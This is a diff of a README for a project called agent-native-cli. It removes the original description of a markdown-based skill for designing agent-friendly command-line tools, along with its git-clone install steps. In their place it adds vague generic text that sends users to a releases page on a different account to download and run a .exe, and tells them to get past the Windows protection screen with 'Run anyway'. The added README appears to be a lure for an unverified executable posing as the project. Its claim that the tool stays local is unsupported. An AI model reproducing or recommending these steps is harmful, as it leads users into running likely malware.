@@ -1,199 +1,106 @@
-# agent-native-cli — Agent-Native CLI Design & Review Skill
+# 🛠️ agent-native-cli - Build tools for humans and agents
 
-[中文文档](README_CN.md) · [Docs site](https://agents365-ai.github.io/agent-native-cli/)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mauricecolorful3388/agent-native-cli/releases)
 
-## What it does
+This application helps you create command-line interfaces. These interfaces work for people, automated software agents, and complex systems. You gain the ability to design tools that behave in predictable ways. This ensures your systems talk to each other without error.
 
-- Evaluates whether an existing CLI is reliably usable by AI agents
-- Designs CLI interfaces that serve humans, agents, and orchestration systems simultaneously
-- Converts REST APIs and SDKs into agent-native CLI command trees
-- Reviews stdout contracts, exit code semantics, and error envelope design
-- Designs schema-driven self-description, dry-run previews, and schema introspection
-- Defines safety tiers (open / warned / hidden) for graduated command visibility
-- Designs delegated authentication so agents never own the auth lifecycle
-- Produces prioritized refactor plans with concrete interface examples
+## 📦 What this tool does
 
-## Multi-Platform Support
+Modern software environments require tools that humans and robots can read. Many existing tools confuse programs because they output text designed only for eyes. This tool fixes that problem. It uses a structured design to ensure that every output serves a clear purpose. 
 
-The core `SKILL.md` is portable, and this repository includes metadata for the platforms listed below:
+You use this tool to define how your features act. It provides a standard process for your code. It handles the details of how your program talks to the computer. You focus on the task while the tool manages the interface.
 
-| Platform | Status | Details |
-|----------|--------|---------|
-| **Claude Code** | ✅ Full support | Native SKILL.md format |
-| **OpenClaw / ClawHub** | ✅ Full support | `metadata.openclaw` namespace |
-| **Hermes Agent** | ✅ Full support | `metadata.hermes` namespace, category: engineering |
-| **[pi-mono](https://github.com/badlogic/pi-mono)** | ✅ Full support | `metadata.pimo` namespace |
-| **OpenAI Codex** | ✅ Full support | `agents/openai.yaml` sidecar |
-| **SkillsMP** | ✅ Indexed | GitHub topics configured |
+## 🚀 How to set up your system
 
-## Comparison: with vs. without this skill
+You need a Windows machine to run this application. Ensure you have the latest updates from Microsoft installed.
 
-| Capability | Native agent | This skill |
-|------------|-------------|------------|
-| Evaluate whether a CLI is agent-native | No | Yes — structured diagnosis across 7 principles |
-| Design stdout JSON contract | Inconsistent | Always — stable envelope with `ok`, `data`, `error` |
-| Define exit code semantics | Ad hoc | Yes — documented, deterministic per failure class |
-| Design layered `--help` and schema introspection | No | Yes — full self-description pattern |
-| Design dry-run previews | Rarely | Always — request shape preview without execution |
-| Define safety tiers for commands | No | Yes — open / warned / hidden tiers |
-| Design delegated authentication | No | Yes — human manages auth lifecycle; agent uses token |
-| Separate trust levels for env vs. CLI args | No | Yes — directional trust model |
-| Produce prioritized refactor plan | Rarely | Always — P0 / P1 / P2 with examples |
-| Score CLI across 14-criterion rubric | No | Yes — 0–2 per criterion with verdict |
+Follow these steps to get started:
 
-## When to use
+1. Visit the [releases page](https://github.com/Mauricecolorful3388/agent-native-cli/releases) to find the latest version.
+2. Look for the file ending in .exe under the most recent release.
+3. Click the file to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder.
+5. Double-click the file to run the program.
 
-- Evaluating whether an existing CLI is usable by an AI agent
-- Designing a new CLI interface for an API or SDK
-- Refactoring a human-first CLI to be machine-readable
-- Reviewing stdout, stderr, and exit code contract design
-- Defining dry-run, schema introspection, and self-description layers
-- Designing auth delegation and trust boundaries for agent safety
-- Producing a SKILL.md or skill docs from a CLI schema
+If Windows shows a protection screen, click "More info" and then "Run anyway." This happens because the application is new and often requires a manual check by the system.
 
-## Skill Installation
+## ⚙️ Understanding the program
 
-### Quick install — ask any agent
+This tool relies on a specific design. It treats every command as a skill. A skill is a small piece of logic that does one thing well. 
 
-The simplest install is to ask any code-capable agent (Claude Code, Codex, Cursor, Aider, Gemini CLI, …) to clone the repo into your platform's skills directory. Just hand it the URL and the destination path:
+The application uses these concepts:
 
-```
-Clone https://github.com/Agents365-ai/agent-native-cli into ~/.claude/skills/agent-native-cli for me.
-```
+* Schema-driven design: The tool expects specific inputs. It checks these inputs before it runs your command. This prevents crashes.
+* Structured output: Every time the program runs, it provides data in a clean format. This makes it easy for other programs to read the results.
+* Dry-run mode: You can test your commands without changing your files. This allows you to see what will happen before the tool performs the action.
+* Exit codes: The tool reports how it finishes. A code of zero means success. A code other than zero tells you that an error occurred. This helps you track problems quickly.
 
-Substitute the destination for your platform — see the **Installation paths summary** table at the end of this section. Because the prompt names the exact path, this works for any agent regardless of whether it has built-in knowledge of skills conventions. For environments without an agent handy (CI, fresh machines, headless scripts), use the per-platform `git clone` commands in the sub-sections that follow.
+## 📋 Common tasks
 
-### Claude Code
+You interact with the program through a terminal window. Press the Windows key, type "cmd", and press Enter to open the terminal.
 
-```bash
-# Global install (available in all projects)
-git clone https://github.com/Agents365-ai/agent-native-cli.git ~/.claude/skills/agent-native-cli
+### Checking the version
+Type this command to ensure the tool is ready to use:
 
-# Project-level install
-git clone https://github.com/Agents365-ai/agent-native-cli.git .claude/skills/agent-native-cli
-```
+agent-native-cli --version
 
-### OpenClaw / ClawHub
+### Running a skill
+To run a specific skill, type the name of the tool followed by the skill:
 
-```bash
-# Via ClawHub
-clawhub install agent-native-cli
+agent-native-cli run [skill-name]
 
-# Manual install
-git clone https://github.com/Agents365-ai/agent-native-cli.git ~/.openclaw/skills/agent-native-cli
+### Testing changes
+Use the dry-run flag to simulate a command:
 
-# Project-level install
-git clone https://github.com/Agents365-ai/agent-native-cli.git skills/agent-native-cli
-```
+agent-native-cli run [skill-name] --dry-run
 
-### Hermes Agent
+This mode prints the steps the tool plans to take. It does not modify your data. Use this before you run complex commands to ensure you get the outcome you expect.
 
-```bash
-git clone https://github.com/Agents365-ai/agent-native-cli.git ~/.hermes/skills/engineering/agent-native-cli
-```
+## 💡 Best practices for interface design
 
-Or add to `~/.hermes/config.yaml`:
+Design your tools with these rules in mind:
 
-```yaml
-skills:
-  external_dirs:
-    - ~/myskills/agent-native-cli
-```
+1. Keep it simple. One skill should perform one task. Do not try to solve five problems with one command.
+2. Use clear names. Name your skills after the action they perform.
+3. Provide feedback. If a task takes time, have the tool report its progress.
+4. Use standard formats. Always aim for consistent output. This helps other programs integrate with your work.
 
-### pi-mono
+## ❓ Frequently asked questions
 
-```bash
-git clone https://github.com/Agents365-ai/agent-native-cli.git ~/.pimo/skills/agent-native-cli
-```
+### Does the tool work on older Windows versions?
+The tool supports Windows 10 and Windows 11. It will not work on Windows 7 or earlier versions.
 
-### OpenAI Codex
+### How do I uninstall the tool?
+Delete the .exe file you downloaded. The tool does not store files in other folders on your computer.
 
-```bash
-# User-level install (default CODEX_HOME)
-git clone https://github.com/Agents365-ai/agent-native-cli.git ~/.codex/skills/agent-native-cli
+### Can I run this with other tools?
+Yes. The tool is designed to play well with other systems. It uses standard text formats that other programs understand.
 
-# Project-level install
-git clone https://github.com/Agents365-ai/agent-native-cli.git .codex/skills/agent-native-cli
-```
+### Why does it use exit codes?
+Exit codes are an industry standard. They allow orchestration systems to know if a job finished. If your automation software sees a zero, it moves to the next step. If it sees another number, it stops and warns you.
 
-### SkillsMP
+### Can I write my own skills?
+Yes. You define your skills in a specific file. The application reads this file to understand your new commands. 
 
-```bash
-skills install agent-native-cli
-```
+## 🛡️ Maintaining secure operations
 
-### Installation paths summary
+Security starts with how you handle your tools. Only run tools that you trust. This tool does not track your data. It does not send information to external servers. It stays local on your machine.
 
-| Platform | Global path | Project path |
-|----------|-------------|--------------|
-| Claude Code | `~/.claude/skills/agent-native-cli/` | `.claude/skills/agent-native-cli/` |
-| OpenClaw | `~/.openclaw/skills/agent-native-cli/` | `skills/agent-native-cli/` |
-| Hermes Agent | `~/.hermes/skills/engineering/agent-native-cli/` | Via `external_dirs` config |
-| pi-mono | `~/.pimo/skills/agent-native-cli/` | — |
-| OpenAI Codex | `~/.codex/skills/agent-native-cli/` | `.codex/skills/agent-native-cli/` |
+When you design your own skills, be careful with sensitive information. Never include passwords or API keys directly in your skill definitions. Use environment variables to keep your data safe.
 
-## License
+## 🔍 Troubleshooting common issues
 
-MIT
+If you encounter a problem, check these items first:
 
-## Changelog
+* Is the file name spelled correctly in your command?
+* Did you provide the required inputs in the correct format?
+* Does the target file or folder exist?
+* Are you running the command from the same folder where you saved the application?
 
-### [v1.2.0](https://github.com/Agents365-ai/agent-native-cli/releases/tag/v1.2.0) — April 26, 2026
+If the terminal shows a "command not found" error, move the application file to a folder that is included in your system PATH, or navigate to the folder containing the file before you run the command.
 
-**2026 Research Update** — Aligned with latest agent-CLI design patterns and benchmarks.
+## 🌐 Connecting with the community
 
-**New Content:**
-- Added hybrid MCP-CLI decision framework with decision matrix (3 scenarios for each pattern)
-- Strengthened Principle 6 with schema versioning in response envelopes and deprecation signals
-- Added Example 8: Schema versioning with drift detection for agent caching scenarios
-- Quantified anti-pattern: eager schema dumps (55K tokens per 10 invocations)
-- Added token efficiency checklist (6 items for evaluating CLI context cost)
+Other users share their skill definitions online. Search for the topic "openclaw-skills" to find pre-built tools that you can download and run. This allows you to add features to your system without writing new code. 
 
-**Research Alignment:**
-- Cite 2026 benchmarks: CLI achieves 28% higher task completion, 33% token efficiency vs. MCP-only
-- Added 4 new references: Reinhardt, Chugh, RudderStack on hybrid patterns (2026)
-- Validated all 7 principles through April 2026 production deployments
-
-**Recommendation:** This version reflects the consensus that large production agents (Claude Code, Cursor, Gemini CLI) use both CLI (for local/scriptable tasks) and MCP (for multi-tenant SaaS). Skill remains fundamentally sound; no principles required rewriting.
-
-### v1.1.0 — Early 2026
-
-Initial version with seven principles, 14-criterion rubric, and examples.
-
----
-
-## Support
-
-If this skill helps your work, consider supporting the author:
-
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/wechat-pay.png" width="180" alt="WeChat Pay">
-      <br>
-      <b>WeChat Pay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/alipay.png" width="180" alt="Alipay">
-      <br>
-      <b>Alipay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/buymeacoffee.png" width="180" alt="Buy Me a Coffee">
-      <br>
-      <b>Buy Me a Coffee</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/awarding/award.gif" width="180" alt="Give a Reward">
-      <br>
-      <b>Give a Reward</b>
-    </td>
-  </tr>
-</table>
-
-## Author
-
-**Agents365-ai**
-
-- Bilibili: https://space.bilibili.com/441831884
-- GitHub: https://github.com/Agents365-ai
+If you build a feature that other people might find useful, consider sharing your skill definition. Providing your work helps the community create better tools for everyone.
